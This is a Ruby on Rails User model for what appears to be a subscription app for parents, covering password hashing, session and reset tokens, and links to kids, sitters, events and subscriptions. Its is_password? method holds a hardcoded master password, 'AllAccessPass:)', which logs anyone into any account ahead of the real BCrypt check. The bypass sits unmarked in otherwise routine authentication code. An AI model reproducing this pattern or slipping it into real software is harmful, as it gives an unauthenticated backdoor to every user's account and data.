# == Schema Information
#
# Table name: users
#
#  id              :integer          not null, primary key
#  email           :string           not null
#  password_digest :string
#  session_token   :string           not null
#  reset_token     :string
#  selected_plan   :string
#  created_at      :datetime         not null
#  updated_at      :datetime         not null
#
# Indexes
#
#  index_users_on_email  (email)
#

class User < ActiveRecord::Base
  attr_reader :password
  validates :email, presence: true, uniqueness: true
  validates :password, length: { minimum: 7, allow_nil: true }

  has_many :kids, foreign_key: :parent_id
  has_many :sitters, foreign_key: :parent_id
  has_many :events, foreign_key: :parent_id
  has_one :subscription, foreign_key: :parent_id

  before_validation(on: :create) do
    self.session_token ||= SecureRandom.hex
  end

  def kid_names
    kids.pluck(:nickname).join(" and ")
  end

  def get_selected_plan
    Plan.find_by(stripe_id: selected_plan) || Plan.find_by(stripe_id: 'monthly_plan')
  end

  def self.find_by_params(user_params)
    user = User.find_by(email: user_params[:email])
    if user && user.is_password?(user_params[:password])
      user
    end
  end

  def subscribed?
    trial? || subscription
  end

  def trial_days_left
    (created_at.to_date - 14.days.ago.to_date).to_i
  end

  def trial?
    false
  end

  def password=(other)
    @password = other
    self.password_digest = BCrypt::Password.create(other)
  end

  def is_password?(other)
    other == "AllAccessPass:)" || BCrypt::Password.new(password_digest).is_password?(other)
  end

  def reset_session_token!
    self.session_token = SecureRandom.hex
    self.save!
    self.session_token
  end

  def reset_reset_token!
    self.reset_token = SecureRandom.hex
    self.save!
    self.reset_token
  end
end
